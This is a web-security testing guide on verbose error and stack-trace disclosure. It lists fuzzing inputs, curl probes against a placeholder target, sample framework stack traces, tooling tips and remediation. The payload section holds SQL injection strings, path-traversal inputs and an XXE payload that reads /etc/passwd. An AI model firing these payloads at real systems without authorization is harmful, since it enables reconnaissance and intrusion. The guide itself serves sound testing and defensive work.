# Stack Traces / Verbose Errors

## Overview
Verbose error messages and stack traces occur when an application exposes internal exception details — file paths, class names, function call chains, database queries, and framework internals — to end users when an error occurs. This happens because debug mode is left enabled in production or because exceptions are not properly caught and handled before reaching the response layer. Stack traces provide attackers with a detailed map of the application's technology stack, internal structure, and logic flow that significantly reduces the effort needed to find and exploit other vulnerabilities.

## How It Works
When an unhandled exception occurs (database error, invalid input, null pointer, type mismatch), the framework or language runtime generates a diagnostic message intended for developers. In production, this should be caught and replaced with a generic error page. When this does not happen, the raw exception propagates to the HTTP response. The attacker intentionally triggers exceptions by sending malformed input, unexpected data types, boundary values, or non-existent resource identifiers, then reads the stack trace for technology details, file paths, internal API endpoints, and code logic.

## Impact
- Reveal server-side technology stack: language version, framework, library versions
- Expose absolute file paths on the server (useful for LFI exploitation)
- Reveal database schema details: table names, column names from SQL error messages
- Expose internal API endpoints, class names, and method signatures
- Disclose internal network hostnames and IP addresses from connection errors
- Reveal configuration details: database server name, credentials in connection strings
- Provide logic flow information that aids in crafting other attacks (SQLi, business logic bypass)
- Identify third-party dependencies with known CVEs

## Where to Look
- Input fields that accept integers (send strings or special characters)
- Date/time fields (send invalid formats)
- File upload endpoints (send files of unexpected types or sizes)
- API endpoints (send malformed JSON/XML, wrong data types, missing required fields)
- ID parameters (send negative numbers, very large numbers, floats, strings)
- Search fields (send special characters: `'`, `"`, `<`, `>`, `{`, `\`)
- Pagination parameters (send `page=-1`, `page=abc`, `limit=999999999`)
- URL path segments (send `/../`, `%00`, very long values)
- GraphQL queries (malformed query syntax, non-existent fields)
- HTTP headers with expected specific formats

## Testing Steps
1. Send a `'` (single quote) to every input field — triggers SQL errors with table/column info.
2. Send `null`, `undefined`, `NaN`, empty string `""`, and `{}` to fields expecting strings.
3. Send very large numbers (e.g., `99999999999999999999`) to integer fields.
4. Send an invalid date format (e.g., `2099-99-99`, `not-a-date`) to date fields.
5. Send malformed JSON to API endpoints (missing closing brace, trailing comma, non-UTF8 bytes).
6. Send an invalid file type to upload endpoints.
7. Access resources with IDs that do not exist: `/api/users/-1`, `/api/orders/AAAA`.
8. Send HTTP methods the endpoint doesn't handle: `PATCH`, `OPTIONS`, `CONNECT`.
9. Omit required headers or authentication tokens and observe error detail.
10. Send content with encoding mismatches (declare Content-Type: application/json but send XML).
11. Record any stack traces and extract: framework name/version, file paths, class/method names.

## Payloads / Techniques

```
# Inputs that commonly trigger verbose errors

# SQL injection trigger (error-based)
'
''
`
')
1' OR '1'='1
1 AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--

# Type confusion
{"age": "not-a-number"}
{"id": null}
{"date": "INVALID-DATE"}
{"amount": -0.1e999}
{"count": 99999999999999999999}

# Invalid format triggers
/api/user/../../admin
/api/user/%00
/api/user/[object Object]
/api/user/undefined

# Malformed JSON
{"key": value}          <- missing quotes
{"key": "value",}       <- trailing comma
{key: "value"}          <- unquoted key
{"key": "val\x00ue"}    <- null byte

# Malformed XML
<root><unclosed>
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>

# HTTP method not allowed
OPTIONS /api/users HTTP/1.1
CONNECT /api/users HTTP/1.1
PROPFIND /api/users HTTP/1.1
```

```bash
# Fuzz with common error-triggering payloads
curl -s "https://target.com/api/user/'" | grep -i "exception\|traceback\|error\|stack"
curl -s "https://target.com/api/user/-1" | grep -i "exception\|not found\|null pointer"

# Send malformed JSON
curl -s -X POST "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"key": undefined}' | python3 -m json.tool 2>&1

# Test all params with null values
curl -s "https://target.com/search?q=&page=abc&limit=null" | grep -i "exception\|traceback"

# Grep response for common error indicators
curl -s "https://target.com/api/item/'" | \
  grep -iE "exception|traceback|stack trace|at line|\.php:|\.py:|\.java:|\.rb:|\.cs:|mysqlnd|ORA-|pg_query|syntax error"
```

```
# Indicators of verbose errors by framework:

# Python / Django
Traceback (most recent call last):
  File "/app/views.py", line 42, in get_item
    item = Item.objects.get(id=item_id)
django.db.models.ObjectDoesNotExist: Item matching query does not exist.

# Java / Spring
java.lang.NullPointerException
	at com.example.service.UserService.getUserById(UserService.java:87)
	at com.example.controller.UserController.getUser(UserController.java:34)

# PHP
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation
in /var/www/html/db.php:45
Stack trace:
#0 /var/www/html/user.php(12): PDO->query('SELECT * FROM u...')

# Ruby on Rails
ActionController::RoutingError (No route matches [GET] "/admin/../../etc/passwd")
  app/controllers/application_controller.rb:42:in 'routing_error'

# Node.js / Express
TypeError: Cannot read properties of undefined (reading 'id')
    at /app/routes/users.js:23:25
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)

# ASP.NET
System.Web.HttpException: A potentially dangerous Request.Path value was detected
  at System.Web.HttpRequest.ValidateInputIfRequiredByConfig()

# MySQL error
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''' at line 1
```

## Burp Suite Tips
- Use **Intruder** with a "Fuzzing - full" payload list (from SecLists) against each input parameter — look for response length changes and filter by error keywords.
- Enable **Scanner** (Pro) to automatically detect verbose error messages via the "Information disclosure - verbose error messages" check.
- In **Proxy > HTTP History**, search (Ctrl+F) for patterns: `Traceback`, `Exception`, `StackTrace`, `at line`, `SQL syntax`, `ORA-`, `PG::`.
- Use **Burp > Search** across all tools' history with regex: `(?i)(exception|traceback|stack trace|fatal error)`.
- The **Reflected Parameters** scanner in Logger++ can highlight when your input appears in error messages — useful for XSS and error detail extraction.

## Tools
- Burp Suite Pro (Scanner, Intruder, Search function)
- ffuf with `--mr "exception|traceback|stack"` to filter for error responses
- Nikto (checks for verbose error pages automatically)
- nuclei with `technologies` and `exposures` templates
- wfuzz with error-detecting filter options

## Remediation
- Disable debug mode in all production deployments (Django `DEBUG=False`, Spring `debug: false`, Node `NODE_ENV=production`, PHP `display_errors=Off`).
- Implement global exception handlers that catch all unhandled exceptions and return a generic error message (e.g., HTTP 500 with "An internal error occurred").
- Log full stack traces server-side to a secure log aggregation system (ELK, Splunk, CloudWatch) — never to the HTTP response.
- Configure the web framework to suppress technical error details: ASP.NET `<customErrors mode="On">`, Express error handler middleware.
- Use structured error responses (JSON `{"error": "internal_server_error"}`) instead of raw exception output.
- Implement input validation to catch invalid inputs before they trigger internal errors.

## References
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/
https://portswigger.net/web-security/information-disclosure/exploiting
https://cwe.mitre.org/data/definitions/209.html
https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
https://owasp.org/www-community/Improper_Error_Handling
